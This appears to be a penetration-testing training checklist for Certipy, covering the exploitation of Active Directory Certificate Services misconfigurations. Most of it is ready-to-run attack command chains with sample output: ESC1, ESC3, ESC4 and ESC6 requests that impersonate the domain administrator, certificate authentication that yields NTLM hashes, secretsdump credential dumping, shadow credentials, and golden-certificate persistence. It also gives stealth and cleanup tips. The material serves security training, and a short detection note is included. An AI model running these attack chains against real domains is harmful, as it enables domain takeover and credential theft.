# 🔑 Certipy: Complete Mastery Checklist

> **What is Certipy?** Certipy is an open-source Python tool for enumerating and exploiting Active Directory Certificate Services (ADCS) misconfigurations. ADCS is Windows's PKI infrastructure for issuing digital certificates within a domain — and it is riddled with well-known misconfiguration classes (ESC1–ESC13) that allow privilege escalation, domain compromise, and persistent access. Certipy automates the discovery and exploitation of all these misconfiguration classes.
>
> **Why does it exist?** The research paper "Certified Pre-Owned" (2021, by Will Schroeder & Lee Christensen of SpecterOps) revealed that ADCS is massively misconfigured in most enterprise environments, and these misconfigurations lead to trivially easy domain compromise. Certipy was built to operationalize this research for penetration testers. In practice, ESC1 (vulnerable certificate template + domain user enrollment) is present in the majority of real-world AD environments.
>
> **When to use it:** Any Active Directory engagement where ADCS is deployed (which is most medium-to-large enterprise environments). After obtaining any domain user account, always run Certipy `find` to check for vulnerable certificate templates. ESC1 is often the fastest path to Domain Admin.
>
> **When to avoid it:** ADCS exploitation generates Event ID 4886/4887 (certificate request/issue) in the CA's security log. In environments with tight monitoring on CA logs, this may trigger detection. Plan accordingly.
>
> **What mastering Certipy unlocks:** One of the most powerful privilege escalation paths in Active Directory, ability to generate golden certificates for persistent domain access, coverage of ADCS in pentest reports, and the skills required to audit organizations' PKI security posture.
>
> **Roadmap Phase:** Phase 6 — Enterprise Attack Paths (Part 25–26, ADCS Exploitation)

---

## 🧭 Navigation

> [🏠 Home](../README.md) · [📋 Roadmap](README.md)

| Active Directory | Credentials | Network | Cloud |
|:----------------|:-----------|:--------|:------|
| [🩸 BloodHound](BloodHound.md) | [🥷 Mimikatz](Mimikatz.md) | [🔧 Impacket](Impacket.md) | [☁️ Prowler](Prowler.md) |
| [🔑 Rubeus](Rubeus.md) | **🔑 Certipy** (you are here) | [💀 NetExec](NetExec.md) | [🐦 Pacu](Pacu.md) |
| [👣 Kerbrute](Kerbrute.md) | | | |

---

## 📊 Progress Overview

| Phase | Focus | Tasks | Est. Time |
|:---:|:---|:---:|:---:|
| 1 | Installation & ADCS Basics | 5 | 2–3 hours |
| 2 | Enumeration with `find` | 7 | 3–4 hours |
| 3 | ESC1 — Vulnerable Templates | 6 | 3–5 hours |
| 4 | ESC3, ESC4, ESC6 — Other Key Misconfigs | 6 | 4–5 hours |
| 5 | Certificate-Based Authentication | 5 | 3–4 hours |
| 6 | Shadow Credentials | 4 | 2–3 hours |
| 7 | Practical Labs | 4 | 5–8 hours |
| | **Total** | **37** | **~22–32 hours** |

**Prerequisites:** Phase 6 Part 25 complete (BloodHound, AD enumeration basics). Understanding of Kerberos and Active Directory fundamentals. Access to a lab AD environment (use GOAD — Game of Active Directory — or a custom lab).

---

# PHASE 1: INSTALLATION & ADCS BASICS

---

## 1.1 Installation

```bash
# Install Certipy
pip3 install certipy-ad

# Verify
certipy --version

# Alternative: from source
git clone https://github.com/ly4k/Certipy
cd Certipy && pip3 install .
```

## 1.2 ADCS Architecture — What You Need to Know

**Key ADCS components:**
- **Certificate Authority (CA):** The server that issues certificates (typically a Windows Server with ADCS role)
- **Certificate Templates:** Blueprints defining what kind of certificates can be issued, who can request them, and with what permissions
- **Enrollment:** The process of requesting a certificate from the CA

**Why ADCS is dangerous:**
- Certificate templates have granular permissions — misconfigured templates allow unprivileged users to request certificates for higher-privileged principals
- Certificates can be used for Kerberos authentication (PKINIT) — functionally equivalent to having a password hash
- Certificates have long lifetimes (1–2 years) — they persist even after password changes
- Certificate issuance doesn't reset on password change — a "golden certificate" provides persistent access

**The ESC Vulnerability Classes:**

| ESC | Vulnerability | Severity |
|:----|:-------------|:---------|
| ESC1 | Template allows SAN specification + low-privilege enrollment | CRITICAL |
| ESC2 | Any Purpose EKU + low-privilege enrollment | HIGH |
| ESC3 | Certificate Request Agent EKU abuse | HIGH |
| ESC4 | Write permissions on certificate template | HIGH |
| ESC5 | Write permissions on PKI objects | HIGH |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA | CRITICAL |
| ESC7 | Vulnerable CA officer permissions | HIGH |
| ESC8 | NTLM relay to AD CS HTTP endpoints | HIGH |
| ESC9–ESC13 | Various newer misconfiguration classes | VARIES |

---

# PHASE 2: ENUMERATION WITH `find`

---

## 2.1 Basic Enumeration

```bash
# Enumerate all ADCS components from any domain user perspective
certipy find -u 'user@domain.local' -p 'Password123' -dc-ip 10.0.0.1

# Or with NTLM hash
certipy find -u 'user@domain.local' -hashes ':NTLMhash' -dc-ip 10.0.0.1

# With Kerberos authentication (use -k flag)
certipy find -u 'user@domain.local' -k -dc-ip 10.0.0.1

# Output: Creates .json and .txt files with full enumeration results
# Also creates a BloodHound-compatible .zip if BloodHound integration available
```

## 2.2 Key Output to Examine

```bash
# View the text report
cat <timestamp>_certipy.txt

# Critical sections:
# - Certificate Authorities:     Shows CA names, settings (EDITF flags), HTTP endpoints
# - Certificate Templates:       Shows all templates + vulnerability flags
# - Vulnerable Templates:        Certipy highlights the vulnerable ones automatically
```

## 2.3 Targeted Enumeration

```bash
# Enumerate only vulnerable certificate templates
certipy find -u 'user@domain.local' -p 'Password123' -dc-ip 10.0.0.1 -vulnerable -stdout

# Example vulnerable template output:
# Certificate Templates
#   0
#     Template Name              : VulnerableUserTemplate
#     Enabled                    : True
#     Client Authentication      : True
#     Enrollee Supplies Subject  : True    ← ESC1 indicator
#     Permissions
#       Enrollment Permissions
#         Enrollment Rights      : Domain Users   ← Any domain user can enroll
#     [!] Vulnerabilities
#       ESC1                     : [...]
```

---

# PHASE 3: ESC1 — VULNERABLE TEMPLATES (MOST COMMON)

---

**ESC1 Requirements:**
1. Template has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag set (Enrollee Supplies Subject)
2. Template has Client Authentication EKU (allows Kerberos auth)
3. Low-privileged users can enroll in the template

**ESC1 Attack:** Request a certificate, supplying your own Subject Alternative Name (SAN) — specifically the `userPrincipalName` of a Domain Admin. The CA issues the certificate for the DA's identity. Use it to authenticate as the DA.

```bash
# Step 1: Identify vulnerable template from certipy find output
# Template: VulnerableUserTemplate, enrolled by: Domain Users

# Step 2: Request certificate as any domain user, specifying DA's UPN in SAN
certipy req -u 'lowprivuser@domain.local' -p 'Password123' \
  -dc-ip 10.0.0.1 \
  -ca 'DOMAIN-CA' \
  -template 'VulnerableUserTemplate' \
  -upn 'administrator@domain.local'    # ← Specifying the DA's UPN

# Output: Saved certificate to administrator.pfx

# Step 3: Authenticate as Domain Admin using the certificate
certipy auth -pfx 'administrator.pfx' -dc-ip 10.0.0.1

# Output:
# [*] Using principal: administrator@domain.local
# [*] Trying to get TGT...
# [*] Got TGT
# [*] Saved credential cache to 'administrator.ccache'
# [*] NT hash: aad3b435b51404eeaad3b435b51404ee:NTLM_HASH_HERE

# Step 4: Use the NTLM hash or TGT for domain compromise
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass domain.local/administrator@DC01
```

---

# PHASE 4: OTHER KEY MISCONFIGURATIONS

---

## 4.1 ESC3 — Certificate Request Agent Abuse

**When:** Template allows enrollment with `Certificate Request Agent` EKU, and another template allows agent-based enrollment.

```bash
# Step 1: Request a Certificate Request Agent certificate
certipy req -u 'user@domain.local' -p 'Password123' \
  -ca 'DOMAIN-CA' -template 'EnrollmentAgent' -dc-ip 10.0.0.1

# Step 2: Use the agent certificate to request on behalf of DA
certipy req -u 'user@domain.local' -p 'Password123' \
  -ca 'DOMAIN-CA' -template 'User' \
  -on-behalf-of 'domain\administrator' \
  -pfx 'user.pfx' -dc-ip 10.0.0.1

# Step 3: Authenticate
certipy auth -pfx 'administrator.pfx' -dc-ip 10.0.0.1
```

## 4.2 ESC4 — Write Permissions on Template

**When:** You have `WriteProperty` on a certificate template object in AD.

```bash
# Step 1: Certipy find identifies template you have write access to
# Step 2: Modify the template to add ESC1 vulnerability
certipy template -u 'user@domain.local' -p 'Password123' \
  -template 'TargetTemplate' -save-old -dc-ip 10.0.0.1

# Step 3: Exploit as ESC1 (enroll with DA UPN)
certipy req -u 'user@domain.local' -p 'Password123' \
  -ca 'DOMAIN-CA' -template 'TargetTemplate' \
  -upn 'administrator@domain.local' -dc-ip 10.0.0.1

# Step 4: Restore original template (operational security)
certipy template -u 'user@domain.local' -p 'Password123' \
  -template 'TargetTemplate' -configuration original.json -dc-ip 10.0.0.1
```

## 4.3 ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 Flag

**When:** The CA itself has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set — this allows SAN specification in ANY certificate request, regardless of template settings.

```bash
# Certipy find output will show:
# [!] CA 'DOMAIN-CA' has 'EDITF_ATTRIBUTESUBJECTALTNAME2' flag set

# Exploit: Request any user-enrollable template with DA UPN
certipy req -u 'user@domain.local' -p 'Password123' \
  -ca 'DOMAIN-CA' -template 'User' \
  -upn 'administrator@domain.local' -dc-ip 10.0.0.1
```

---

# PHASE 5: CERTIFICATE-BASED AUTHENTICATION

---

## 5.1 Using a Certificate to Get a TGT + NTLM Hash

```bash
# From a .pfx file (password protected)
certipy auth -pfx 'administrator.pfx' -password 'pfxpassword' -dc-ip 10.0.0.1

# From a .pfx file (no password)
certipy auth -pfx 'administrator.pfx' -dc-ip 10.0.0.1

# Output includes:
# - TGT saved as .ccache (use with impacket, bloodhound, etc.)
# - NTLM hash (use with pass-the-hash attacks)

# Use the TGT:
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass domain.local/administrator@DC01.domain.local
```

## 5.2 PKINIT — Certificate-Based Kerberos Authentication

```bash
# Certipy auth performs PKINIT under the hood
# The certificate proves identity → KDC issues TGT → you get NTLM hash

# Manual with Rubeus (alternative):
Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /password:pfxpassword
```

---

# PHASE 6: SHADOW CREDENTIALS

---

Shadow Credentials is a related technique: add a Key Credential to a user/computer object's `msDS-KeyCredentialLink` attribute, then use the credential to perform PKINIT and get an NTLM hash.

```bash
# Requires: GenericWrite or equivalent permission on a user/computer object

# Add shadow credential to target user
certipy shadow add -u 'attacker@domain.local' -p 'Password123' \
  -target 'victim_user' -account 'victim_user' -dc-ip 10.0.0.1

# Authenticate using the shadow credential
certipy shadow auto -u 'attacker@domain.local' -p 'Password123' \
  -target 'victim_user' -account 'victim_user' -dc-ip 10.0.0.1

# Output: TGT + NTLM hash for victim_user

# Clean up (remove shadow credential)
certipy shadow remove -u 'attacker@domain.local' -p 'Password123' \
  -target 'victim_user' -account 'victim_user' -device-id '<DEVICE_ID>' -dc-ip 10.0.0.1
```

---

# PHASE 7: PRACTICAL LABS

---

- [ ] **Lab 1 — ADCS Enumeration:** Set up a lab AD environment with ADCS (use GOAD, or manually install AD CS on a Windows Server). Run `certipy find -vulnerable`. Document every vulnerable template and vulnerability class found.

- [ ] **Lab 2 — ESC1 End-to-End:** In the lab, create a vulnerable certificate template (enable "Enrollee Supplies Subject" + Client Authentication EKU + Domain Users enrollment). As a low-priv domain user, perform the full ESC1 attack chain: `certipy req` (specify DA UPN) → `certipy auth` → get DA NTLM hash → use `secretsdump.py` to dump NTDS.dit.

- [ ] **Lab 3 — Golden Certificate:** After compromising the CA's private key (via `certipy ca -backup`), forge a certificate for any domain user. This is the "golden certificate" — it provides persistent access even after password resets, until the CA certificate expires or is rotated. Demonstrate persistence by authenticating after a password change.

- [ ] **Lab 4 — Shadow Credentials:** Create a lab user with `GenericWrite` on another user. Use `certipy shadow auto` to perform the shadow credentials attack and retrieve the target user's NTLM hash without ever knowing or changing their password.

---

## 📝 Operational Notes

- **Certipy requires impacket:** Certipy is built on impacket for network operations. Ensure compatible versions: `pip3 install impacket certipy-ad`.
- **Clock skew:** Kerberos authentication is time-sensitive (5-minute tolerance). Sync your attack machine's clock to the DC: `sudo ntpdate -u <DC_IP>`.
- **Certificate stores on Windows:** Certificates issued via ADCS are stored in Windows Certificate Store. View them: `certmgr.msc` (user) or `certlm.msc` (computer). Alternatively, enumerate via PowerShell: `Get-ChildItem Cert:\CurrentUser\My`.
- **Detection:** ADCS exploitation events: Event ID 4886 (Certificate Services received a certificate request), 4887 (Certificate Services approved and issued a certificate). The Subject field will show the UPN specified in the SAN — a DA UPN in a certificate requested by a low-priv user is an obvious IOC. Monitor for these with Splunk/Wazuh.
- **ESC1 vs Kerberoasting:** ESC1 (when present) is faster and stealthier than Kerberoasting. It doesn't require cracking a hash — the certificate directly authenticates. Always check for ADCS vulnerabilities before resorting to noisier techniques.
